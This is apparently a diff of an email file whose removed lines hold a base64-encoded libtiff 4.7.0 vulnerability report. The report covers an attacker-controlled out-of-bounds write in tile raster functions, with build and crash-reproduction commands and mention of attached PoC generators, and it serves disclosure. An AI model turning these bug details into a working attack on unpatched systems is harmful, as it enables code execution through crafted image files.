-IGltZy5oZWlnaHQgKGUuZy4sIDB4RkZGRikgYW5kIGEgdmFsaWQgcmhlaWdodCAoZS5nLiwgMjU2
-KSwgdGhpcyBjb21wdXRhdGlvbiByZXN1bHRzIGluIGEgbGFyZ2UgcG9zaXRpdmUgb2Zmc2V0LCBj
-YXVzaW5nIHRoZSByYXN0ZXIgcG9pbnRlciAoY3ApIHBhc3NlZCBpbnRvIGZ1bmN0aW9ucyBsaWtl
-IHB1dDhiaXRjbWFwdGlsZSgpIG9yIHB1dDFiaXRid3RpbGUoKSB0byBwb2ludCBiZXlvbmQgdGhl
-IGJvdW5kcyBvZiB0aGUgYWxsb2NhdGVkIGJ1ZmZlci4KCkluc2lkZSB0aG9zZSBmdW5jdGlvbnMs
-IG1lbW9yeSB3cml0ZXMgb2NjdXIgbGlrZSB0aGlzOgoKKmNwKysgPSBQQUxtYXBbKnBwXVswXTsK
-CuKAoiBUaGUgd3JpdGUgYWRkcmVzcyAoY3ApIGlzIGF0dGFja2VyLWNvbnRyb2xsZWQgdmlhIHRo
-ZSBvZmZzZXQgY2FsY3VsYXRpb24gZnJvbSBpbWcuaGVpZ2h0LgrigKIgVGhlIHZhbHVlIHdyaXR0
-ZW4gKFBBTG1hcFsqcHBdWzBdKSBpcyBhbHNvIGF0dGFja2VyLWNvbnRyb2xsZWQ6CiAgICDil6Yg
-KnBwIGlzIGRlcmVmZXJlbmNlZCBmcm9tIHBpeGVsIGRhdGEgaW4gdGhlIGltYWdlIGZpbGUuCiAg
-ICDil6YgUEFMbWFwIGlzIGNvbnN0cnVjdGVkIGZyb20gdGhlIGltYWdlJ3MgY29sb3IgcGFsZXR0
-ZSwgd2hpY2ggdGhlIGF0dGFja2VyIGFsc28gY29udHJvbHMuCgpUaGlzIGNvbnN0aXR1dGVzIGEg
-d3JpdGUtd2hhdC13aGVyZSB2dWxuZXJhYmlsaXR5IHdpdGggYSBhdHRhY2tlciBjb250cm9sLiBF
-eHBsb2l0YXRpb24gb2YgYSB3cml0ZS13aGF0LXdoZXJlIHByaW1pdGl2ZSBjYW4gbGVhZCB0byBk
-ZW5pYWwgb2Ygc2VydmljZSBvciBjb2RlIGV4ZWN1dGlvbiB0aHJvdWdoIHN1cHBseSBvZiBtYWxp
-Y2lvdXNseSBjcmFmdGVkIGZpbGVzLgoKVmVyc2lvbgoKNC43LjAKClN0ZXBzIHRvIHJlcHJvZHVj
-ZQoKICAgIENPbXBpbGUgaGFybmVzcy5jIGNsYW5nIC1PMCAtZyAgIC1JbGlidGlmZiAtSWJ1aWxk
-LWNsZWFuICAgLW8gdGlmZl9wb2NfY3Jhc2hlciBwb2NfY3Jhc2hlci5jIGJ1aWxkLWNsZWFuL2xp
-YnRpZmYvbGlidGlmZi5hIC1seiAtbHpzdGQgLWx3ZWJwIC1sd2VicGRlbXV4IC1sZGVmbGF0ZSAt
-bGx6bWEgLWxqcGVnIC1sbSAtbGpiaWcgLWxMZXJjCgogICAgLi90aWZmX2Z1enpfY2xlYW4gLi9j
-cmFzaGZpbGUxLnRpZmYKClRoaXMgc2hvdWxkIGNyZWF0ZSBhIHNlZyBmYXVsdC4KClRoZSBDb2Rl
-IFBPQyBhbmQgdGlmZiBmaWxlcyBhcmUgYXR0YWNoZWQgLSBhcyBhcmUgdGhlIHB5dGhvbiBmaWxl
-cyB0byBnZW5lcmF0ZSBhIG1hbGljaW91cyBvbmUuCgpOb3RlOiB0ZXN0R2VuLnB5IHdpbGwgZ2Vu
-ZXJhdGUgYSBjcmFzaCAudGlmZiBmaWxlLiAoaSdtIHVuYWJsZSB0byB1cGxvYWQgdGhlIC50aWZm
-IGZpbGUpCgpJIG9yaWdpbmFsbHkgY3JlYXRlZCB0aGlzIGFzIGEgY29uZmlkZW50aWFsIGlzc3Vl
-IC0gYnV0IGRpZG4ndCBzZWVtIHRvIGhhdmUgYW55IGV5ZXMgb24gaXQuCgpQbGF0Zm9ybQoKVGhp
-cyB3YXMgdGVzdGVkIG9uOiBEaXN0cmlidXRvciBJRDogVWJ1bnR1IERlc2NyaXB0aW9uOiBVYnVu
-dHUgMjQuMDQuMiBMVFMgUmVsZWFzZTogMjQuMDQgQ29kZW5hbWU6IG5vYmxlCgpSZXF1ZXN0OiBJ
-IHdpbGwgcmVxdWVzdCBhIENWRSBmb3IgdGhpcy4gT25jZSB0aGlzIGlzIHJlc29sdmVkIGFuZCBm
-aXhlZCBJIHdpc2ggdG8gcmVwbGljYXRlIHRoZSBQb0Mgb24gbXkgZ2l0aHViOiBodHRwczovL2dp
-dGh1Yi5jb20vU2V4eVNob2VsZXNzR29kb2ZXYXJwb2NfY3Jhc2hlci5jdGVzdEdlbi5weQoKSGVy
-ZSBpcyBhIHNjcmVlbnNob3QsIHNob3dpbmcgdGhlIGFwcHJvcHJpYXRlIGluZm9ybWF0aW9uIG9u
-IGNyYXNoLiBJdCBzaG93cyB0aGUgY29kZSBsb2NhdGlvbiwgdGhlIG9mZmVuZGluZyBhc3NlbWJs
-eSBpbnN0cnVjdGlvbiBhbmQgdGhlIGNvbnRyb2wgb2YgUjE1ZCBhbmQgUlNJIGltYWdlCgpOb3Rl
-cwoKSWYgdGhlcmUncyBhbnl0aGluZyBlbHNlIEkgY2FuIGhlbHAgd2l0aCwgcGxlYXNlIGxldCBt
-ZSBrbm93LiBJIGNhbiBwcm92aWRlIG1vcmUgaW5mb3JtYXRpb24sIGFzIG5lZWRlZCBvciBhbnN3
-ZXIgYW55IG90aGVyIHF1ZXN0aW9ucy4KClRoYW5rcyEgR2FyZXRoCg==
-
---------------7R0oKrm3Nf8Ki7p8fBlUCwp0--
+------=_Part_2509180_399487137.1435682544577--
